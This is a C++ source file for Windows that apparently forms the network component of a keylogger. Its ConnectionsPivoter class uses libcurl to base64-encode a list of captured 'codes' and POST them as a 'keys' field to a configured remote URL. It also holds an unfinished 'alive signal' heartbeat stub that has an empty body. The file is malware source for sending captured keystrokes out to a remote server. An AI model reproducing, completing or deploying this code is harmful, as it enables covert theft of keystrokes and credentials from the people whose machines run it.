#define CURL_STATICLIB

#include "connections_pivoter.h"
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <iterator>
#include <algorithm>
#include <Windows.h>
#include <curl/curl.h>
#include "base64.h"

#pragma comment (lib, "Normaliz.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Wldap32.lib")
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "advapi32.lib")
#pragma comment (lib, "User32.lib")

// temp function 
std::string join(std::vector<std::string> v) {
	std::stringstream ss; 
	std::copy(v.begin(), v.end(),
		std::ostream_iterator<std::string>(ss, " "));

	return ss.str();
}

// RESOURCE: https://curl.se/libcurl/c/
ConnectionsPivoter::ConnectionsPivoter(std::string url) {
	this->url = url; 

	curl_global_init(CURL_GLOBAL_ALL);
	this->curl = curl_easy_init();
}

BOOL ConnectionsPivoter::send_alive_signal() {
	
}

BOOL ConnectionsPivoter::send_codes(std::vector<std::string> codes) {
	if (!this->curl)
		return false;

	curl_easy_setopt(this->curl, CURLOPT_URL, this->url.c_str());
	std::string keys_message = Base64::encode(join(codes)); 
	keys_message = curl_easy_escape(this->curl, keys_message.c_str(), keys_message.size());
	keys_message = "keys=" + keys_message; 
	curl_easy_setopt(this->curl, CURLOPT_POSTFIELDS, keys_message.c_str());

	CURLcode res = curl_easy_perform(this->curl); 

	if (res != CURLE_OK)
		return false; 

	return true; 
}
